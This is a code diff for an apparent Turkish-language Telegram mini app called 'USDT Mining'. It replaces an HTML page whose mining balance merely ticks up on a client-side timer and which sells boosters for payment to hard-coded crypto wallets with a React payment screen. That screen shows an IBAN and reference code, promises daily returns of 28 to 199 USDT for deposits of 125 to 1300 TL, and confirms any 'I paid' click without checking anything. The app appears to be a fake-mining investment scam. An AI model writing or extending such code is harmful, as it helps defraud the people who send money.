@@ -1,136 +1,110 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>USDT Mining Mini App</title>
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #f0f0f0;
-      color: #222;
-    }
-    .container {
-      padding: 20px;
-    }
-    .section {
-      background: #fff;
-      border-radius: 10px;
-      padding: 15px;
-      margin-bottom: 15px;
-      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
-    }
-    h2 {
-      margin: 0 0 10px 0;
-      font-size: 20px;
-    }
-    button {
-      background: #0088cc;
-      border: none;
-      color: white;
-      padding: 10px 15px;
-      border-radius: 6px;
-      margin-top: 10px;
-      cursor: pointer;
-    }
-    .wallet-box {
-      background: #f9f9f9;
-      padding: 10px;
-      border-radius: 6px;
-      margin-top: 10px;
-      font-family: monospace;
-    }
-    .payment-buttons button {
-      background: #eee;
-      color: #000;
-      margin-right: 5px;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <div class="section">
-      <h2>Madencilik</h2>
-      <p>Hashrate: <span id="hashrate">3 GH/s</span></p>
-      <p>Bakiye: <span id="balance">0.0000</span> USDT</p>
-      <p>Toplam Kazanç: <span id="total">0.0000</span> USDT</p>
-      <button onclick="claim()">Ödülü Al</button>
-      <button onclick="boost()">Booster Satın Al</button>
-    </div>
+import React, { useState } from 'react';
+import { Button } from '@/components/ui/button';
+import { CheckCircle } from 'lucide-react';
 
-    <div class="section">
-      <h2>Arkadaşlarınla Paylaş</h2>
-      <button onclick="window.open('https://t.me/UsdtToMiningBot?start=share', '_blank')">Telegram'da Paylaş</button>
-    </div>
+const validAmounts = [125, 275, 600, 680, 1000, 1300];
 
-    <div class="section">
-      <h2>Mağaza</h2>
-      <div>
-        <p>10.000 puan - 1 TON</p>
-        <button onclick="showPayment('TON')">Satın Al</button>
-      </div>
-      <div>
-        <p>55.000 puan - 5 TON</p>
-        <button onclick="showPayment('TON')">Satın Al</button>
-      </div>
-      <div id="payment-area" style="display:none">
-        <h4>Nasıl ödeme yapmak istiyorsun?</h4>
-        <div class="payment-buttons">
-          <button onclick="showAddress('TON')">TON</button>
-          <button onclick="showAddress('TRX')">TRX</button>
-          <button onclick="showAddress('DOGE')">DOGE</button>
+export default function TelegramMiniApp() {
+  const [amount, setAmount] = useState('');
+  const [name, setName] = useState('');
+  const [submitted, setSubmitted] = useState(false);
+  const [error, setError] = useState('');
+
+  const handleCopy = (text) => {
+    navigator.clipboard.writeText(text);
+  };
+
+  const handleSubmit = () => {
+    const numAmount = parseInt(amount);
+    if (!numAmount || !validAmounts.includes(numAmount)) {
+      setError('Yanlış tutar girdiniz, tekrar deneyin.');
+      return;
+    }
+    if (!name.trim()) {
+      setError('Ad ve soyad zorunludur.');
+      return;
+    }
+    setError('');
+    setSubmitted(true);
+  };
+
+  return (
+    <div className="min-h-screen bg-black text-white p-4 flex flex-col items-center">
+      <h1 className="text-2xl font-bold mb-6">USDT MİNİNG ÖDEME EKRANI</h1>
+
+      <div className="bg-gray-900 rounded-2xl p-4 w-full max-w-md space-y-4 shadow-xl">
+        <div>
+          <label className="block text-sm">IBAN</label>
+          <div className="flex items-center justify-between bg-gray-800 p-2 rounded-xl">
+            <span>TR230010300000000014365322</span>
+            <Button onClick={() => handleCopy('TR230010300000000014365322')} className="bg-green-600 text-white">Kopyala</Button>
+          </div>
         </div>
-        <div class="wallet-box" id="addressBox"></div>
+
+        <div>
+          <label className="block text-sm">IBAN Adı</label>
+          <div className="flex items-center justify-between bg-gray-800 p-2 rounded-xl">
+            <span>Moka United Ödeme ve Elektronik Para Kuruluşu A.Ş.</span>
+            <Button onClick={() => handleCopy('Moka United Ödeme ve Elektronik Para Kuruluşu A.Ş.')} className="bg-green-600 text-white">Kopyala</Button>
+          </div>
+        </div>
+
+        <div>
+          <label className="block text-sm">Açıklama Kısmına Yazılacak</label>
+          <div className="flex items-center justify-between bg-gray-800 p-2 rounded-xl">
+            <span>73915374874</span>
+            <Button onClick={() => handleCopy('73915374874')} className="bg-green-600 text-white">Kopyala</Button>
+          </div>
+        </div>
+
+        <div className="bg-gray-800 p-4 rounded-xl">
+          <p className="font-semibold mb-2">Yatırım Seçenekleri:</p>
+          <ul className="list-disc list-inside space-y-1 text-sm">
+            <li>1 işlemci - 125 TL - Günlük gelir: 28 USDT</li>
+            <li>2 işlemci - 275 TL - Günlük gelir: 50 USDT</li>
+            <li>3 işlemci - 600 TL - Günlük gelir: 90 USDT</li>
+            <li>4 işlemci - 680 TL - Günlük gelir: 140 USDT</li>
+            <li>5 işlemci - 1000 TL - Günlük gelir: 170 USDT</li>
+            <li>6 işlemci - 1300 TL - Günlük gelir: 199 USDT</li>
+          </ul>
+        </div>
+
+        {!submitted ? (
+          <div className="space-y-4">
+            <div>
+              <label className="block text-sm">Yatırdığınız Tutar (TL)</label>
+              <input
+                type="number"
+                value={amount}
+                onChange={(e) => setAmount(e.target.value)}
+                className="w-full p-2 rounded-xl bg-gray-700 text-white border border-gray-600"
+              />
+            </div>
+            <div>
+              <label className="block text-sm">Adınız ve Soyadınız</label>
+              <input
+                type="text"
+                value={name}
+                onChange={(e) => setName(e.target.value)}
+                className="w-full p-2 rounded-xl bg-gray-700 text-white border border-gray-600"
+              />
+            </div>
+            {error && <p className="text-red-500 text-sm">{error}</p>}
+            <Button onClick={handleSubmit} className="w-full bg-green-600 text-white">\u00d6deme Yaptım</Button>
+          </div>
+        ) : (
+          <div className="text-center space-y-4">
+            <CheckCircle className="w-10 h-10 text-green-500 mx-auto" />
+            <p className="text-green-400 font-semibold">\u00d6deme talebiniz alındı</p>
+            <a
+              href="https://t.me/UsdtToMiningBot"
+              className="inline-block w-full text-center bg-green-600 text-white p-2 rounded-xl"
+            >
+              Bota Geri Dön
+            </a>
+          </div>
+        )}
       </div>
     </div>
-  </div>
-
-  <script>
-    let hashrate = 3;
-    let balance = 0;
-    let total = 0;
-
-    const addresses = {
-      TON: "UQDyN-f4ZUbC0RT_RgW0IcwAxWy48Nbvw05TgWSi4Nhv2aOe",
-      TRX: "TDCJDChfTyXY4qegtE6J9PBbhj6rwT5Qrj",
-      DOGE: "DM1DfvkB46xFy9WmN8Xr8jmAhLL3kb7Kdh"
-    };
-
-    function updateUI() {
-      document.getElementById("hashrate").textContent = hashrate + " GH/s";
-      document.getElementById("balance").textContent = balance.toFixed(4);
-      document.getElementById("total").textContent = total.toFixed(4);
-    }
-
-    function claim() {
-      total += balance;
-      balance = 0;
-      updateUI();
-      alert("Kazancın cüzdana aktardıldı");
-    }
-
-    function boost() {
-      hashrate += 3;
-      alert("Booster aktif! Hashrate 3 GH/s artırıldı");
-    }
-
-    function showPayment(type) {
-      document.getElementById("payment-area").style.display = "block";
-    }
-
-    function showAddress(type) {
-      document.getElementById("addressBox").textContent = "Adres: " + addresses[type];
-    }
-
-    setInterval(() => {
-      balance += (11 / 86400) * (hashrate / 3);
-      updateUI();
-    }, 1000);
-
-    Telegram.WebApp.ready();
-    updateUI();
-  </script>
-</body>
-</html>
+  );
+}
